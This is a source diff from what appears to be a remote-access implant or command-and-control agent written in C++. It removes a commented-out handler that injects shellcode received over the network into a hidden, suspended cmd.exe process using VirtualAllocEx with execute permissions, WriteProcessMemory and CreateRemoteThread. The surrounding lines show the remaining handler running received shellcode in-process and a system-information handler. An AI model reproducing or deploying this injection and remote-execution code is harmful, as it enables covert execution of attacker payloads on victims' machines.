@@ -113,52 +113,6 @@ void Controller::handleExecuteShellcode(const InternalMessage& msg)
 	WaitForSingleObject(thread, INFINITE); // Wait for thread to complete
 }
 
-/* NOTE: creating seperate process entirely
-bool Controller::handleExecuteShellcode(const InternalMessage& msg)
-{
-	std::cout << "executeShellcode in separate process" << std::endl;
-
-	// Create a temporary process to host the shellcode
-	STARTUPINFO si = { sizeof(si) };
-	PROCESS_INFORMATION pi;
-
-	wchar_t cmdline[] = L"cmd.exe /c timeout 1 > nul";  // Dummy process
-
-	if (CreateProcess(NULL, cmdline, NULL, NULL, FALSE,
-		CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
-	{
-		// Allocate memory in the remote process
-		LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, msg.header.dataSize,
-			MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-		if (remoteMem)
-		{
-			// Write shellcode to remote process
-			WriteProcessMemory(pi.hProcess, remoteMem, msg.data.data(), msg.header.dataSize, NULL);
-
-			// Create remote thread to execute shellcode
-			HANDLE remoteThread = CreateRemoteThread(pi.hProcess, NULL, 0,
-				(LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
-			if (remoteThread)
-			{
-				// Wait for shellcode to complete (with timeout)
-				WaitForSingleObject(remoteThread, 10000);
-				CloseHandle(remoteThread);
-			}
-		}
-
-		// Clean up the temporary process
-		TerminateProcess(pi.hProcess, 0);
-		CloseHandle(pi.hProcess);
-		CloseHandle(pi.hThread);
-
-		std::cout << "Shellcode executed in separate process" << std::endl;
-		return true;
-	}
-
-	std::cout << "Failed to create separate process" << std::endl;
-	return false;
-}*/
-
 void Controller::handleSystemInfo(const InternalMessage& msg)
 {
 	std::cout << "Controller::handleSystemInfo()" << std::endl;
